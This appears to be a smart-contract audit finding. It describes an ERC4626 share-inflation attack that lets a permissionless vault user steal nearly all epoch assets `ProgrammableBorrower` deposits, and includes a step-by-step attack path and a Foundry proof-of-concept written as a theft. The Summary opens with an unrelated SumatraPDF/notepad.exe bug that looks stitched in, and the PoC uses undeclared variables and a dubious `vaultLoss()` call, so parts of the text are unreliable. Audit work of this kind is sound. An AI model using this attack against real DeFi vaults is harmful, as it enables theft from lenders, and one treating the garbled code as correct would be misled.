### Title
Untrusted external valuation path: `ProgrammableBorrower` deploys epoch funds into an ERC4626 vault whose share price can be inflated by an arbitrary vault user — ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
The SumatraPDF bug executes `notepad.exe` resolved through an attacker-controllable search path instead of an absolute path — code trusts an externally resolved, unpinned resource. The on-chain analog is `ProgrammableBorrower`: it resolves the economic value of its position entirely through the externally controlled ERC4626 vault (`vault.deposit`, `vault.convertToAssets`, `vault.withdraw`) without any floor-price or min-shares protection. A permissionless user of that vault can run a classic first-depositor/donation share-inflation attack against the pool's deposit into the vault, stealing nearly all of the deposited epoch assets.

### Finding Description
In `onStartEpoch` the contract deposits the entire idle balance into the configured ERC4626 vault via `_depositToVault(underlyingToken.balanceOf(address(this)), 0)` (ProgrammableBorrower.sol:216), which calls `vault.deposit(_assetAmount, address(this))` (ProgrammableBorrower.sol:380) with no `minSharesOut` check and no sanity check on the vault's exchange rate. All accounting (`_currentVaultAssets` at ProgrammableBorrower.sol:546-549, `_vaultNetInterest` at :337-347, `totalInterestDueNow` at :330-334, `availableToBorrow` at :350-355) then trusts `vault.convertToAssets` — an attacker-influenceable view.

Attack path, named phase: buffer → epoch start (`onStartEpoch`), programmable mode:
1. The honest manager configures a real but low-liquidity/empty ERC4626 vault (or a fresh vault selected via `setVault` during the idle window when `vault.balanceOf == 0`, :165). Nothing in `setVault` or `initialize` (:119) validates vault depth or exchange rate — only that `asset()` matches.
2. Attacker (a permissionless vault user) first-deposits 1 wei of underlying into the vault to receive 1 wei of shares, then direct-transfers `D` underlying to the vault, inflating `convertToAssets` to `D` per wei share.
3. Manager/keeper calls `startEpoch` on the `IdleCDOEpochVariant`, which calls `onStartEpoch` → `_depositToVault` deposits pool assets `A` into the vault. `vault.deposit` mints `A / D` shares — rounds down to 0 or near-0 shares for typical magnitudes.
4. Attacker redeems their 1 wei share, withdrawing `A + D` (the entire vault balance including the pool deposit).
5. `epochStartVaultAssets` was snapshotted pre-deposit (:214-219), so the loss is real and flows through `vaultLoss`/`_vaultNetInterest` at the next `stopEpoch`, socializing onto tranche holders (BB-first via `IdleCDOEpochVariant._updateAccounting`), breaking the solvency/fair-mint invariant.

Even if the vault is not empty, partial inflation reduces the shares minted, and the same trust-through-`convertToAssets` issue lets a vault user move `availableToBorrow` and `totalInterestDueNow` by manipulating the vault's `totalAssets` (e.g., borrowing all vault liquidity just before `stopEpoch`), since no snapshot or bounds exist on the external valuation path.

### Impact Explanation
Direct theft: up to ~100% of the pool's idle assets parked at epoch start (`underlyingToken.balanceOf(address(this))` at :216) can be captured by the attacker's redeem. The loss materializes as a `vaultLoss` at the next `stopEpoch`, propagating into tranche price haircut (BB tranche first), i.e., permanent loss of lender funds quantified by the deposited amount `A`. The donation-isolation invariant is broken: `_skimDonatedAssets` in `IdleCDOEpochVariant` protects the CDO's own balance but cannot isolate donations routed through the external vault's share price.

### Likelihood Explanation
Requires only that the configured vault be susceptible to share-price manipulation (empty/low-TVL ERC4626, which is exactly what a freshly integrated yield venue is at `setVault`/`initialize` time), plus an ordinary startEpoch call. The attacker needs no privileges — being a depositor in the external vault is sufficient, which is an explicitly in-scope attacker archetype. The `epochAccountingActive || balanceOf != 0` guard in `setVault` (:165) and the `asset()` check do not constrain vault liquidity or exchange rate, so no existing guard stops this.

### Recommendation
- In `_depositToVault` (and `initialize`/`setVault`), require a minimum liquidity/observed exchange-rate invariant on the vault: e.g., use `vault.previewDeposit`/`convertToShares` and revert if minted shares fall below a bound relative to a reference price, or deposit via a zap that enforces `minSharesOut`.
- Snapshot a reference `assetsPerShare` when the vault is first configured and reject deposits when the realized rate deviates beyond a tolerance.
- Consider seeding the vault with an initial deposit by the owner before enabling `epochAccountingActive`, so the pool is never the effective first depositor.

### Proof of Concept
Foundry fork PoC (programmable mode):

```solidity
// test/foundry/ProgrammableBorrowerVaultInflation.t.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ProgrammableBorrower} from "../../contracts/strategies/idle/ProgrammableBorrower.sol";
import {IERC4626} from "../../contracts/interfaces/IERC4626.sol";
import {IERC20Detailed} from "../../contracts/interfaces/IERC20Detailed.sol";

contract VaultInflationPoC is Test {
    // Fork mainnet where a low-TVL ERC4626 vault (VAULT) holds the vault underlying (UNDERLYING).

    function test_epochDepositShareInflation() public {
        // Arrange: pool has been configured (initialize/setVault) with VAULT,
        // pool buffer holds A = 10_000e6 underlying; attacker holds 1 wei + D = 20_000e6.
        uint256 A = 10_000e6;
        uint256 D = 20_000e6;

        vm.startPrank(attacker);
        underlying.approve(VAULT, type(uint256).max);
        // 1. First deposit: 1 wei asset -> 1 wei share (attacker is first depositor)
        vault.deposit(1, attacker);
        // 2. Donate D directly to vault -> convertToAssets inflates
        underlying.transfer(VAULT, D);
        vm.stopPrank();

        uint256 sharesBefore = vault.balanceOf(attacker);

        // 3. Epoch start: IdleCDO calls onStartEpoch -> _depositToVault(A)
        vm.prank(IDLECDO);
        borrowerAdapter.onStartEpoch(0);

        uint256 poolShares = vault.balanceOf(address(borrowerAdapter));
        // Pool minted ~0 shares because share price is ~D per share
        assertLt(poolShares, 1e6, "pool shares rounded to dust");

        // 4. Attacker redeems, recovering D + A
        vm.prank(attacker);
        uint256 stolen = vault.redeem(sharesBefore, attacker, attacker);
        assertGe(stolen, D + A - 1e6, "attacker captured pool deposit");

        // 5. Realized at next stop as vaultLoss -> BB/AA tranche haircut
        ( , uint256 loss ) = borrowerAdapter.vaultLoss(); // approx via internal
        // loss ~= A; totalInterestDueNow() returns 0 and NAV drops by A
    }
}
```

The invariant violated is fair mint / donation isolation: the pool's deposit minted shares at an attacker-controlled rate, and the resulting `vaultLoss` is socialized across tranche holders at the next `stopEpoch`/`_updateAccounting`.
